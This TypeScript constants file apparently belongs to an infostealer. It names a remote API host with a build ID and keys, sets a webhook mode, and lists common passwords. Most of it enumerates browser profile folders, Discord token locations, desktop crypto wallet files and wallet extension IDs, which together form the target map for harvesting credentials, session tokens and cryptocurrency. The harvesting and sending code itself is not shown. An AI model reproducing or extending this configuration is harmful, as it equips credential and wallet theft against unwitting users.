import path from 'path';
import os from 'os';
import { BrowserPaths, WalletPath, OperaConfig, BrowserConfig } from '../types';

const homedir = os.homedir();
const rawAppData = process.env.APPDATA || '';
const rawlocalappdata = process.env.localappdata || '';
function looksLikeSystemProfile(v: string) {
    if (!v) return false;
    return /system32\\config\\systemprofile/i.test(v) || /\\bSYSTEMPROFILE\\b/i.test(v) || /systemprofile/i.test(v);
}

export const appData = (!rawAppData || looksLikeSystemProfile(rawAppData)) ? path.join(homedir, 'AppData', 'Roaming') : rawAppData;
export const localappdata = (!rawlocalappdata || looksLikeSystemProfile(rawlocalappdata)) ? path.join(homedir, 'AppData', 'Local') : rawlocalappdata;
export const tempDir = os.tmpdir();
export const LOCAL = localappdata;
export const ROAMING = appData;

export const BASE_API_URL = "https://api.hdstlr.net";
export const BUILD_ID = "8533584312";
export const THEME = "NormalGame";
export const API_KEY = "06698e554e9f65d2";

export const STEAM_API_KEY = '440D7F4D810EF9298D25EDDF37C1F902';

export const nggrkey = "WEBHOOK_MODE";

export const wordlistFilePath = path.join(tempDir, 'X7G8JQW9LFH3YD2KP6ZTQ4VMX5N8WB1RHFJQ.txt');

export const defaultPasswords: string[] = [
    '1234', '12345', '123456', '12345678', '123456789',
    'password', 'admin', 'root', 'qwerty', 'abc123',
    'letmein', 'welcome', '1234567', 'passw0rd', '1234567890',
    '1q2w3e4r', 'sunshine', 'iloveyou', 'football', 'monkey',
    'superman', 'hunter2', 'dragon', 'baseball', 'shadow',
    'trustno1', 'password1', 'master', 'login', 'qazwsx',
    'starwars', '654321', 'access', '123qwe', 'zaq12wsx',
    '1qaz2wsx', 'hello123', 'batman', 'charlie', 'letmein123',
    'mustang', '696969', 'michael', 'freedom', 'secret',
    'abc12345', 'loveyou', 'whatever', 'trustme', '666666'
];

export const browserPathsX: BrowserPaths = {
    chrome: [
        `AppData\\Local\\Google\\Chrome\\User Data\\`,
        `AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\`,
        `AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\`,
        `AppData\\Local\\Google\\Chrome\\User Data\\Profile 3\\`,
        `AppData\\Local\\Google\\Chrome\\User Data\\Profile 4\\`,
        `AppData\\Local\\Google\\Chrome\\User Data\\Profile 5\\`,
        `AppData\\Local\\Google\\Chrome\\User Data\\Guest Profile\\`
    ],
    opera: [
        `AppData\\Roaming\\Opera Software\\Opera Stable\\`,
        `AppData\\Roaming\\Opera Software\\Opera GX Stable\\`,
        `AppData\\Local\\Opera Software\\Opera GX Stable\\`
    ],
    brave: [
        `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\`,
        `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\`,
        `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\`,
        `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\`,
        `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\`,
        `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\`,
        `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\`
    ],
    yandex: [
        `AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Profile 1\\`,
        `AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Profile 2\\`,
        `AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Profile 3\\`,
        `AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Profile 4\\`,
        `AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Profile 5\\`,
        `AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\`
    ],
    edge: [
        `AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\`,
        `AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\`,
        `AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 2\\`,
        `AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 3\\`,
        `AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 4\\`,
        `AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 5\\`,
        `AppData\\Local\\Microsoft\\Edge\\User Data\\Guest Profile\\`
    ]
};

export const browserPaths: BrowserPaths = {
    'Google(x86)': `AppData\\Local\\Google(x86)\\Chrome\\User Data`,
    'Google SxS': `AppData\\Local\\Google\\Chrome SxS\\User Data`,
    'Chromium': `AppData\\Local\\Chromium\\User Data`,
    'Thorium': `AppData\\Local\\Thorium\\User Data`,
    'Chrome': `AppData\\Local\\Google\\Chrome\\User Data`,
    'MapleStudio': `AppData\\Local\\MapleStudio\\ChromePlus\\User Data`,
    'Iridium': `AppData\\Local\\Iridium\\User Data`,
    '7Star': `AppData\\Local\\7Star\\7Star\\User Data`,
    'CentBrowser': `AppData\\Local\\CentBrowser\\User Data`,
    'Chedot': `AppData\\Local\\Chedot\\User Data`,
    'Vivaldi': `AppData\\Local\\Vivaldi\\User Data`,
    'Kometa': `AppData\\Local\\Kometa\\User Data`,
    'Elements': `AppData\\Local\\Elements Browser\\User Data`,
    'Epic': `AppData\\Local\\Epic Privacy Browser\\User Data`,
    'uCozMedia': `AppData\\Local\\uCozMedia\\Uran\\User Data`,
    'Fenrir': `AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer`,
    'Catalina': `AppData\\Local\\CatalinaGroup\\Citrio\\User Data`,
    'Coowon': `AppData\\Local\\Coowon\\Coowon\\User Data`,
    'Liebao': `AppData\\Local\\liebao\\User Data`,
    'QIP Surf': `AppData\\Local\\QIP Surf\\User Data`,
    'Orbitum': `AppData\\Local\\Orbitum\\User Data`,
    'Comodo': `AppData\\Local\\Comodo\\Dragon\\User Data`,
    '360Browser': `AppData\\Local\\360Browser\\Browser\\User Data`,
    'Maxthon3': `AppData\\Local\\Maxthon3\\User Data`,
    'K-Melon': `AppData\\Local\\K-Melon\\User Data`,
    'CocCoc': `AppData\\Local\\CocCoc\\Browser\\User Data`,
    'Amigo': `AppData\\Local\\Amigo\\User Data`,
    'Torch': `AppData\\Local\\Torch\\User Data`,
    'Sputnik': `AppData\\Local\\Sputnik\\Sputnik\\User Data`,
    'Edge': `AppData\\Local\\Microsoft\\Edge\\User Data`,
    'DCBrowser': `AppData\\Local\\DCBrowser\\User Data`,
    'Yandex': `AppData\\Local\\Yandex\\YandexBrowser\\User Data`,
    'UR Browser': `AppData\\Local\\UR Browser\\User Data`,
    'Slimjet': `AppData\\Local\\Slimjet\\User Data`,
    'BraveSoftware': `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data`,
    'Opera': `AppData\\Roaming\\Opera Software\\Opera Stable`,
    'Opera GX': `AppData\\Roaming\\Opera Software\\Opera GX Stable`,
    'Opera GX Local': `AppData\\Local\\Opera Software\\Opera GX Stable`,
};

export const PATHS: BrowserPaths = {
    'Discord': path.join(ROAMING, 'discord'),
    'Discord Canary': path.join(ROAMING, 'discordcanary'),
    'Discord PTB': path.join(ROAMING, 'discordptb'),
    'Lightcord': path.join(ROAMING, 'Lightcord'),
    'Brave': path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'Chrome': path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Chrome SxS': path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
    'Edge': path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
    'Opera': path.join(ROAMING, 'Opera Software', 'Opera Stable'),
    'Opera GX': path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
    'Vivaldi': path.join(LOCAL, 'Vivaldi', 'User Data'),
    'Yandex': path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data'),
    'Amigo': path.join(LOCAL, 'Amigo', 'User Data'),
    'Torch': path.join(LOCAL, 'Torch', 'User Data'),
    'Kometa': path.join(LOCAL, 'Kometa', 'User Data'),
    'Orbitum': path.join(LOCAL, 'Orbitum', 'User Data'),
    'CentBrowser': path.join(LOCAL, 'CentBrowser', 'User Data'),
    '7Star': path.join(LOCAL, '7Star', '7Star', 'User Data'),
    'Sputnik': path.join(LOCAL, 'Sputnik', 'Sputnik', 'User Data'),
    'Epic Privacy Browser': path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
    'Uran': path.join(LOCAL, 'uCozMedia', 'Uran', 'User Data'),
    'Iridium': path.join(LOCAL, 'Iridium', 'User Data'),
};

export const operaGXPath = path.join(appData, 'Opera Software', 'Opera GX Stable');

export const configsOpera: { [key: string]: OperaConfig } = {
    "operagx": {
        bin: path.join(localappdata || '', 'Programs', "Opera GX", 'opera.exe'),
        userData: path.join(appData || '', 'Opera Software', 'Opera GX Stable')
    }
};

export const browsers: BrowserConfig[] = [
    { name: "Chrome", exec: "chrome.exe", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", userDir: "Google\\Chrome" },
    { name: "Brave", exec: "brave.exe", path: "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", userDir: "BraveSoftware\\Brave-Browser" },
    { name: "Edge", exec: "msedge.exe", path: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", userDir: "Microsoft\\Edge" },
    { name: "Vivaldi", exec: "vivaldi.exe", path: "C:\\Program Files\\Vivaldi\\vivaldi.exe", userDir: "Vivaldi" },
    { name: "Chromium", exec: "chromium.exe", path: "C:\\Program Files\\Chromium\\Application\\chromium.exe", userDir: "Chromium" },
    { name: "Epic", exec: "epic.exe", path: "C:\\Program Files\\Epic Privacy Browser\\epic.exe", userDir: "Epic Privacy Browser" },
    { name: "Yandex", exec: "browser.exe", path: "C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe", userDir: "Yandex\\YandexBrowser" }
];

export const browsersopw = [
    { name: 'Chrome', userDataPath: path.join(localappdata, 'Google/Chrome/User Data') },
    { name: 'Edge', userDataPath: path.join(localappdata, 'Microsoft/Edge/User Data') },
    { name: 'Brave', userDataPath: path.join(localappdata, 'BraveSoftware/Brave-Browser/User Data') },
    { name: 'Vivaldi', userDataPath: path.join(localappdata, 'Vivaldi/User Data') },
    { name: 'Chromium', userDataPath: path.join(localappdata, 'Chromium/User Data') },
    { name: 'Epic', userDataPath: path.join(localappdata, 'Epic Privacy Browser/User Data') },
    { name: 'Yandex', userDataPath: path.join(localappdata, 'Yandex/YandexBrowser/User Data') },
    { name: 'Opera', userDataPath: path.join(appData, 'Opera Software/Opera Stable') },
    { name: 'OperaGX', userDataPath: path.join(appData, 'Opera Software/Opera GX Stable') }
];

export const desktopWalletPaths = {
    'Exodus': path.join(appData, 'Exodus', 'exodus.wallet'),
    'Electrum': path.join(appData, 'Electrum', 'wallets'),
    'Atomic': path.join(appData, 'atomic', 'Local Storage', 'leveldb'),
    'Coinomi': path.join(localappdata, 'Coinomi', 'Coinomi', 'wallets'),
    'Guarda': path.join(appData, 'Guarda', 'Local Storage', 'leveldb'),
    'Armory': path.join(appData, 'Armory'),
    'Zcash': path.join(appData, 'Zcash'),
    'Bytecoin': path.join(appData, 'bytecoin'),
    'DashCore': path.join(appData, 'DashCore'),
    'Ethereum': path.join(appData, 'Ethereum', 'keystore'),
    'Jaxx': path.join(appData, 'com.liberty.jaxx', 'IndexedDB', 'file__0.indexeddb.leveldb'),
    'BinanceDesktop': path.join(appData, 'Binance', 'app_store')
};

export const WALLET_PATHS = [
    { name: "MetaMask", id: "nkbihfbeogaeaoehlefnkodbefgpgknn" },
    { name: "Binance", id: "fhbohimaelbohpjbbldcngcnapndodjp" },
    { name: "Phantom", id: "bfnaoomepdephakmegedneabnneijbbe" },
    { name: "Coinbase", id: "hnfanknocfeofbddgcijnmhnfnkdnaad" },
    { name: "TrustWallet", id: "egjidjbpgmcnheetpkhadkkclpchoofn" },
    { name: "MartianAptos", id: "efbglgjekebbhclcjgreakbbghbcaffg" }
];

export const BROWSER_PATHS = {
    'Chrome': path.join(localappdata, 'Google', 'Chrome', 'User Data'),
    'Edge': path.join(localappdata, 'Microsoft', 'Edge', 'User Data'),
    'Brave': path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'Opera': path.join(appData, 'Opera Software', 'Opera Stable'),
    'OperaGX': path.join(appData, 'Opera Software', 'Opera GX Stable')
};

export const isFirstRun = true;